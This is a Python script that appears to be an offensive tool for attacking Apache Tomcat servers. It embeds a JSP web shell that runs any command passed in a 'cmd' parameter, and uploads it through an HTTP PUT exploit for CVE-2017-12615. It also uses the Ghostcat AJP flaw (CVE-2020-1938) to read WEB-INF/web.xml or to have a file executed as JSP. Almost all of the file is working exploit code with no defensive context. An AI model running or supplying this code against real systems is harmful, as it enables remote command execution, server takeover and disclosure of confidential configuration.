import re
import utfc.ajpShooter as ajsp
import utfc.tomcat_2020_1938 as exp_201938
import requests
class tom: 
    url=""

    shell = br'''
<%@ page import="java.util.*,java.io.*,java.net.*"%>
<%
out.println("afox");
out.println("<br>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <br>");
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) { out.println(disr); disr = dis.readLine(); }
}

%>
    '''
    def __init__(self,url):
        self.url = url
        # self.exp1()
        self.exp2(det=False)

    def exp1(self):
        #cve-2017-12615
        try:
            requests.put(self.url+'fox01.jsp/',data=self.shell)
            if 'afox' in requests.get(self.url+'fox01.jsp').text:
                print('[+]cve-2017-12615|',self.url+'fox01.jsp?cmd=whoami')
            else:
                print('[ ]cve-2017-12615 ')
        except:
            print('[ ]cve-2017-12615 ')
        print('- ' * 50)
        print()
    def exp2(self,root='/',fn='WEB-INF/web.xml',portj=8009,det=True,eval=False):
        ip = self.url.split('/')
        head = ip[0]+'//'
        if len(ip[-1]) <6:
            ip = ip[-2]
        else :
            ip = ip[-1]
        ipx = ip.split(':')
        ip = ':'.join(ipx[:-1])

        t= exp_201938.Tomcat(ip, portj)
        rpg='fucker.fuck'
        if eval:
            rpg='fucker.jsp'
        _,data = t.perform_request(root+rpg,attributes=[
            {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
            {'name':'req_attribute','value':['javax.servlet.include.path_info',fn]},
            {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
        ])
        if(len(data)> 0):
            if det:
                print("".join([d.data.decode() for d in data]))
            print('- ' * 50)
            print('[+]cve-2020-1938')
        else:
            print('- ' * 50)
            print('[ ]cve-2020-1938')



    
